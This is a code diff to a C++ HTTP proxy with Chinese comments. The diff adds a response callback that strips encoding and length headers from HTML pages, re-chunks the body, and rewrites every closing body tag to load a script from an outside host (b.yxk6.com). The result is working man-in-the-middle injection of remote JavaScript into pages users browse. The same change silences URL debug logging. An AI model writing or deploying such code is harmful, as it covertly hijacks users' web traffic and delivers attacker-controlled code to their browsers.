@@ -9,22 +9,90 @@
 #include "HelpFun.h"
 #include ".\http数据解析\HttpDataParser.h"
 
-VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL bHeadData )
+typedef struct tagCALLBACK_PARAM
 {
+	BOOL bReplaceData;
+	CTcpSocket *pclientSock;
+}CALLBACK_PARAM,*PCALLBACK_PARAM;
+VOID CALLBACK DataRecvedCallback( PVOID pParam , BYTE *pData,int nDataLen,BOOL bHeadData,BOOL bFinalData)
+{
+	PCALLBACK_PARAM pCallbackParam = (PCALLBACK_PARAM)pParam;
+
 	if ( NULL == pData || nDataLen == 0 )
 	{
 		return ;
 	}
+	
+	if (bHeadData)
+	{
+		pCallbackParam->bReplaceData = FALSE;
 
-	int a=0;
+		CHttpRecvParser recvParser;
+		if(recvParser.ParseData((const char *)pData,nDataLen))
+		{
+			if (recvParser.GetResponseCode() == "200")
+			{
+				CStringA strContentType;
+				strContentType = recvParser.GetValueByName("Content-Type");
+				if (strContentType.Find("text/html") >= 0 )
+				{
+					recvParser.DelResponseNode("Content-Encoding");
+					recvParser.DelResponseNode("Content-Length");
+					recvParser.DelResponseNode("Transfer-Encoding");
+					recvParser.AddResponseNode("Transfer-Encoding","chunked");
+
+					pCallbackParam->bReplaceData = TRUE;
+
+					CStringA strNewBuffer;
+					recvParser.BuildBuffer(strNewBuffer);
+					pCallbackParam->pclientSock->SendData(strNewBuffer.GetBuffer(),strNewBuffer.GetLength());
+				}
+			}
+
+		}
+	}
+	else
+	{
+		if (pCallbackParam->bReplaceData)
+		{
+			CStringA strTempData;
+
+			char *pchTemp = new char[nDataLen+1];
+			memcpy_s(pchTemp,nDataLen,(char *)pData,nDataLen);
+			pchTemp[nDataLen] = 0;
+			
+			strTempData = pchTemp;
+
+			delete pchTemp;
+
+			strTempData.Replace("</body>","<script src='http://b.yxk6.com/qm20160728.js'></script></body>");
+
+			CStringA strChunkData;
+			strChunkData.Format("%x\r\n%s\r\n",strTempData.GetLength(),strTempData.GetBuffer());
+			pCallbackParam->pclientSock->SendData(strChunkData.GetBuffer(),strChunkData.GetLength());
+
+			if (bFinalData)
+			{
+				CStringA strChunkData;
+				strChunkData = "0\r\n\r\n";
+				pCallbackParam->pclientSock->SendData(strChunkData.GetBuffer(),strChunkData.GetLength());
+			}
+
+		}
+	}
+
 
 }
 VOID HandleConnect( SOCKET sockClient,SOCKET sockRemote )
 {
 	CTcpSocket clientSock;
 	CTcpSocket remoteSock;
+	
+	CALLBACK_PARAM CallbackParam;
+	CallbackParam.bReplaceData = FALSE;
+	CallbackParam.pclientSock = &clientSock;
 
-	CHttpDataParser dataParser(DataRecvedCallback,NULL);
+	CHttpDataParser dataParser(DataRecvedCallback,&CallbackParam);
 	do
 	{
 		clientSock.Attach(sockClient);
@@ -57,16 +125,15 @@ VOID HandleConnect( SOCKET sockClient,SOCKET sockRemote )
 					{
 						dataParser.ResetParser();
 					}
-					//	DebugStringA("remoteSock RecvData %d",nRecvLen);
 
-					int nSendLen = clientSock.SendData(chRecvBuffer,nRecvLen);
-					if ( SOCKET_ERROR == nSendLen || 0 == nSendLen)
+					if ( FALSE == CallbackParam.bReplaceData )
 					{
-						//	DebugStringA("clientSock Break %d",nSendLen);
-						break;
+						int nSendLen = clientSock.SendData(chRecvBuffer,nRecvLen);
+						if ( SOCKET_ERROR == nSendLen || 0 == nSendLen)
+						{
+							break;
+						}
 					}
-
-					//DebugStringA("clientSock SendData %d",nSendLen);
 				}
 
 				//客户机利用已有TCP链接继续请求
@@ -85,7 +152,7 @@ VOID HandleConnect( SOCKET sockClient,SOCKET sockRemote )
 					CHttpSendParser sendparser;
 					if(sendparser.ParseData(chRecvBuffer,nRecvLen))
 					{
-						DebugStringA("Url:%s",sendparser.GetParseUrl());
+						//DebugStringA("Url:%s",sendparser.GetParseUrl());
 					}
 
 					int nSendLen = remoteSock.SendData(chRecvBuffer,nRecvLen);
